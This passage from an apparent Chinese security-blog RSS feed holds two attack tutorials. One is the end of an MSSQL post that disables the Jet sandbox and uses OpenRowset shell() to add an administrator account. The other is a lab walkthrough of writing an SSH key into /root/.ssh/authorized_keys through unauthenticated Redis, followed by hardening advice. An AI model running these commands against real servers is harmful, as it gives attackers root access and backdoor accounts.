&lt;p&gt;&lt;strong&gt;执行上面这条语句前&lt;/strong&gt;要执行&lt;code&gt;exec sp_configure &amp;#39;show advanced options&amp;#39;, 1;&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;官方对这句话的解释是：&lt;/strong&gt;&lt;code&gt;show advanced options&lt;/code&gt;,&lt;strong&gt;“显示高级选项”&lt;/strong&gt;选项用来显示 sp_configure 系统存储过程高级选项。 &lt;/p&gt;
&lt;p&gt;当&lt;strong&gt;“显示高级选项”&lt;/strong&gt; 设置为&lt;code&gt;1&lt;/code&gt; 时，可以使用 sp_configure 列出高级选项。 &lt;code&gt;默认值为 0&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-沙盒提权步骤-不常用&#34;&gt;&lt;a href=&#34;#0x04-沙盒提权步骤-不常用&#34; class=&#34;headerlink&#34; title=&#34;0x04 沙盒提权步骤(不常用)&#34;&gt;&lt;/a&gt;0x04 沙盒提权步骤(不常用)&lt;/h2&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--提权语句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;-- 不开启的话在执行xp_regwrite会提示让我们开启，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ad Hoc Distributed Queries&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_regwrite &lt;span class=&#34;string&#34;&gt;&amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;REG_DWORD&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master.dbo.xp_regread &lt;span class=&#34;string&#34;&gt;&amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--执行系统命令select * from openrowset(&amp;#x27;microsoft.jet.oledb.4.0&amp;#x27;,&amp;#x27;;database=c:/windows/system32/ias/ias.mdb&amp;#x27;,&amp;#x27;select shell(&amp;quot;net user HeyJack2 HeyJack2 /add&amp;quot;)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; openrowset(&lt;span class=&#34;string&#34;&gt;&amp;#x27;microsoft.jet.oledb.4.0&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;;database=c:/windows/system32/ias/ias.mdb&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;select shell(&amp;quot;net localgroup administrators HeyJack2 /add&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;沙盒模式SandBoxMode参数含义（默认是2）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0&lt;/code&gt;：在任何所有者中禁止启用安全模式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&lt;/code&gt; ：为仅在允许范围内&lt;/p&gt;
&lt;p&gt;&lt;code&gt;2&lt;/code&gt; ：必须在access模式下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;3&lt;/code&gt;：完全开启&lt;/p&gt;
&lt;p&gt;openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--恢复配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_regwrite &lt;span class=&#34;string&#34;&gt;&amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;REG_DWORD&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ad Hoc Distributed Queries&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，SQL Server(MSSQL)提权攻击演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</guid>
            <title>Redis提权攻击</title>
            <link>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</link>
            <category>数据库安全</category>
            <pubDate>Tue, 27 Sep 2022 00:02:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;Redis&lt;/strong&gt;（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI &lt;a href=&#34;https://baike.baidu.com/item/C语言&#34;&gt;C语言&lt;/a&gt;编写、支持网络、可基于内存亦可持久化的日志型、Key-Value&lt;a href=&#34;https://baike.baidu.com/item/数据库/103728&#34;&gt;数据库&lt;/a&gt;，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由&lt;a href=&#34;https://baike.baidu.com/item/Pivotal&#34;&gt;Pivotal&lt;/a&gt;赞助。&lt;/p&gt;
&lt;h2 id=&#34;0x00-Redis提权攻击&#34;&gt;&lt;a href=&#34;#0x00-Redis提权攻击&#34; class=&#34;headerlink&#34; title=&#34;0x00 Redis提权攻击&#34;&gt;&lt;/a&gt;0x00 Redis提权攻击&lt;/h2&gt;&lt;p&gt;​    &lt;strong&gt;Redis&lt;/strong&gt;在默认情况下，会绑定在 0.0.0.0:&lt;strong&gt;6379&lt;/strong&gt;上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，这样将会将 Redis服务&lt;code&gt;暴露到公网&lt;/code&gt;上。&lt;/p&gt;
&lt;p&gt;​    如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。&lt;/p&gt;
&lt;p&gt;​    攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的&lt;code&gt;/root/.ssh&lt;/code&gt;文件夹的&lt;code&gt;authotrized_keys&lt;/code&gt;文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;目标靶机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Ubuntu18.04&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.143&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;攻击主机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Kali2022&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.145&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;如果没有攻击机没有安装ssh则：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install openssh-server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启动ssh服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo service ssh start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x01-被攻击机部分准备工作&#34;&gt;&lt;a href=&#34;#0x01-被攻击机部分准备工作&#34; class=&#34;headerlink&#34; title=&#34;0x01 被攻击机部分准备工作&#34;&gt;&lt;/a&gt;0x01 被攻击机部分准备工作&lt;/h2&gt;&lt;p&gt;在Ubuntu安装redis服务器&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install redis-server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212305161.png&#34; alt=&#34;image-20220926212305161&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改/etc/redis/redis.conf，总共有三点：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212807655.png&#34; alt=&#34;image-20220926212807655&#34;&gt;&lt;/p&gt;
&lt;p&gt;①去除bind&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213107025.png&#34; alt=&#34;image-20220926213107025&#34;&gt;&lt;/p&gt;
&lt;p&gt;②daemonize yes&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213521318.png&#34; alt=&#34;image-20220926213521318&#34;&gt;&lt;/p&gt;
&lt;p&gt;③protected-mode no&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232253189.png&#34; alt=&#34;image-20220926232253189&#34;&gt;&lt;/p&gt;
&lt;p&gt;重启服务&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service redis stop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;以root身份启动redis服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo redis-server /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;尝试在服务器上自己连一下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(显示127.0.0.1:6379则OK)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232522408.png&#34; alt=&#34;image-20220926232522408&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x02-攻击机部分准备工作&#34;&gt;&lt;a href=&#34;#0x02-攻击机部分准备工作&#34; class=&#34;headerlink&#34; title=&#34;0x02 攻击机部分准备工作&#34;&gt;&lt;/a&gt;0x02 攻击机部分准备工作&lt;/h2&gt;&lt;p&gt;在攻击机上生成rsa秘钥&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214148985.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;重定向到key.txt&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /home/kali/.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(echo -e &amp;quot;\n\n&amp;quot;; cat id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; key.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214549834.png&#34; alt=&#34;image-20220926214549834&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二句话的含义？其实就是在id_rsa.pub的前后加了一个回车&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214811675.png&#34; alt=&#34;image-20220926214811675&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后，我们在攻击机（也就是我的kali）上安装redis-cli&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://download.redis.io/redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -zxf redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进入到 redis-stable 目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd redis-stable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;拷贝&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cp ./src/redis-cli /usr/bin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220032721.png&#34; alt=&#34;image-20220926220032721&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现如下字样就说明安装成功：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;回车&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220238790.png&#34; alt=&#34;image-20220926220238790&#34;&gt;&lt;/p&gt;
&lt;p&gt;将我们生成的key.txt 放到远程主机(也就是开了redis服务的服务器)的redis-cli内存上，查看远程服务器的ip为：192.168.138.143&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220116946.png&#34; alt=&#34;image-20220926220116946&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-开始攻击&#34;&gt;&lt;a href=&#34;#0x03-开始攻击&#34; class=&#34;headerlink&#34; title=&#34;0x03 开始攻击&#34;&gt;&lt;/a&gt;0x03 开始攻击&lt;/h2&gt;&lt;p&gt;拿到redis的shell后基本操作：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;info  #查看redis的信息和服务器信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flushall 删除全部数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del key  删除键为key的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get key  得到参数key的数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926234426901.png&#34; alt=&#34;image-20220926234426901&#34;&gt;&lt;/p&gt;
&lt;p&gt;在我们的攻击机(kali)上运行如下代码：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;看到回显了OK以后&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli -h 192.168.138.143进入shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926222112479.png&#34; alt=&#34;image-20220926222112479&#34;&gt;&lt;/p&gt;
&lt;p&gt;将目录切换到/root/.ssh&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dir /root/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926231146929.png&#34; alt=&#34;image-20220926231146929&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置数据库名，覆盖我们的文件（保存数据库的内容到/root/.ssh/authorized_keys ）&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232746706.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后，回到生成秘钥的终端：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用ssh命令 以root用户的身份 连接“被攻击机”的ip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.138.143&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232832651.png&#34; alt=&#34;image-20220926232832651&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，redis提权攻击完成。&lt;/p&gt;
&lt;h2 id=&#34;0x04-修复建议-安全加固&#34;&gt;&lt;a href=&#34;#0x04-修复建议-安全加固&#34; class=&#34;headerlink&#34; title=&#34;0x04 修复建议/安全加固&#34;&gt;&lt;/a&gt;0x04 修复建议/安全加固&lt;/h2&gt;&lt;h3 id=&#34;1-禁止一些高危命令-重启redis才能生效&#34;&gt;&lt;a href=&#34;#1-禁止一些高危命令-重启redis才能生效&#34; class=&#34;headerlink&#34; title=&#34;1.禁止一些高危命令(重启redis才能生效)&#34;&gt;&lt;/a&gt;&lt;strong&gt;1.禁止一些高危命令&lt;/strong&gt;(重启redis才能生效)&lt;/h3&gt;&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者另起名字&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name2&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name3&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;来禁用远程修改 DB 文件地址&lt;/p&gt;
&lt;h3 id=&#34;2-以低权限运行-Redis-服务&#34;&gt;&lt;a href=&#34;#2-以低权限运行-Redis-服务&#34; class=&#34;headerlink&#34; title=&#34;2.以低权限运行 Redis 服务&#34;&gt;&lt;/a&gt;&lt;strong&gt;2.以低权限运行 Redis 服务&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;groupadd -r redis &amp;amp;&amp;amp; useradd -r -g redis redis&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;3-为-Redis-添加密码验证&#34;&gt;&lt;a href=&#34;#3-为-Redis-添加密码验证&#34; class=&#34;headerlink&#34; title=&#34;3.为 Redis 添加密码验证&#34;&gt;&lt;/a&gt;&lt;strong&gt;3.为 Redis 添加密码验证&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
